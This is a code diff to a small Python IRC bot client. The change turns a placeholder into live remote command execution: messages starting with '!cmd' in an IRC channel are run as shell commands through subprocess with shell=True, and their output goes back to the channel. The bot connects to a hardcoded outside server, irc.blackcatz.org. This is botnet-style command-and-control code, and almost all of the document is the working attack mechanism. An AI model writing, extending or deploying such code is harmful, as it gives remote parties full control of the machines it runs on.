@@ -59,7 +59,6 @@ class bCli(object):
 	
 	def _recv(self, buffer):
 		for line in buffer.splitlines():
-						
 			if line.find("PING")!=-1:
 				self._send("PONG", line.split()[1])
 				continue
@@ -76,11 +75,10 @@ class bCli(object):
 					if msg.find("!cmd ")!=-1:
 						msg = msg.split()[1:]
 						msg = ' '.join(str(x) for x in msg)
-						self._send("PRIVMSG", "[+] New command added to queue: %s" % (msg))
-						#
-						# self._exec(blah bleh)
-						#
-												
+						self._send("PRIVMSG", "[+] Running command: `%s`" % (msg))
+						self._exec(msg)
+						continue
+
 			except ValueError:
 				pass
 											
@@ -95,10 +93,20 @@ class bCli(object):
 					buffer = i.recv(IRC_BUFFER)
 					self._recv(buffer)
 			
-	def _exec(self, command=[]):
-		self.cmd = command
-		print "Command: %s" % (self.cmd)
-
-
+	def _exec(self, msg):
+		self.cmd = msg
+		line_num = 0
+		try:
+			p = subprocess.Popen(self.cmd, shell=True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
+			for line in p.stdout:
+				line_num += 1
+				self._send("PRIVMSG", "    [Line %d] %s" % (line_num, line))
+			p.wait()
+		except subprocess.CalledProcessError:	
+			print "Error calling command: %s" % (self.cmd)
+			pass
+#
+# ------------
+#
 a=bCli("irc.blackcatz.org", 6697)
-a._connect("#bots")
+a._connect("#howtohack")
